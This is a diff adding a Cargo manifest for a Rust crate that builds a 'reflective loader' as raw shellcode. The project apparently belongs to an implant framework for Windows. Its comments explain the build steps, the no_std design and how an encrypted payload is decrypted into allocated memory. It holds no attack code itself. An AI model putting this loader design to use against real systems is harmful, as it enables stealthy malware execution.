@@ -1,0 +1,59 @@
+# Cargo manifest for the on-target LAYER2 PIC loader (Rustic64 / b1tg style).
+#
+# This crate is **compiled to a raw PIC binary** and embedded into the
+# nyx-loader stub by `nyx_loader::on_target::PIC_LOADER_BIN`. It is NOT a
+# workspace member — like `crates/implant-win` it is built standalone with
+# nightly + the Windows mingw target + `-Zbuild-std`, so the macOS dev-host
+# `cargo build --workspace` stays green.
+#
+# Build (regenerate `pic-loader.bin`):
+#
+#   RUSTFLAGS="-Cpanic=abort" \
+#     cargo +nightly build --release \
+#       --manifest-path crates/nyx-loader/pic-loader/Cargo.toml \
+#       --target x86_64-pc-windows-gnu \
+#       -Zbuild-std=core,compiler_builtins
+#   cargo run --release -p nyx-pic-dumper   # extracts .text -> pic-loader.bin
+#
+# Why `no_std` + `no_main`: the LAYER2 bytes execute as bare PIC shellcode
+# before any loader has run — no `std`, no heap, no `main`. `panic = "abort"`
+# (profile + RUSTFLAGS) avoids pulling in unwind tables. Crypto is composed
+# from the raw `chacha20` + `poly1305` primitives (no `alloc` feature) so we
+# never need a `#[global_allocator]` — the decrypt writes directly into the
+# VirtualAlloc'd output page.
+
+[package]
+name = "nyx-pic-loader"
+version = "0.2.0"
+edition = "2021"
+license = "Apache-2.0 OR MIT"
+publish = false
+description = "Nyx LAYER2 reflective loader — compiled to a raw PIC binary that runs as shellcode."
+
+# Standalone (NOT in the root workspace) so the dev-host stable workspace stays
+# green. Declares its own (empty) workspace to decouple from the root members.
+[workspace]
+
+[lib]
+crate-type = ["cdylib"]
+
+[dependencies]
+# Raw AEAD primitives, NO `alloc` feature — we compose ChaCha20-Poly1305 by
+# hand per RFC 8439 so the loader needs no `#[global_allocator]`.
+chacha20 = { version = "0.9", default-features = false }
+poly1305 = { version = "0.8", default-features = false }
+# `cipher` traits (KeyInit / KeyIvInit / StreamCipher) — re-exported by
+# chacha20 but we depend on them directly so the trait imports resolve even
+# if chacha20's re-export is reshuffled upstream.
+cipher = { version = "0.4", default-features = false }
+
+[profile.dev]
+panic = "abort"
+opt-level = "z"
+
+[profile.release]
+opt-level = "z"
+lto = true
+codegen-units = 1
+panic = "abort"
+strip = true
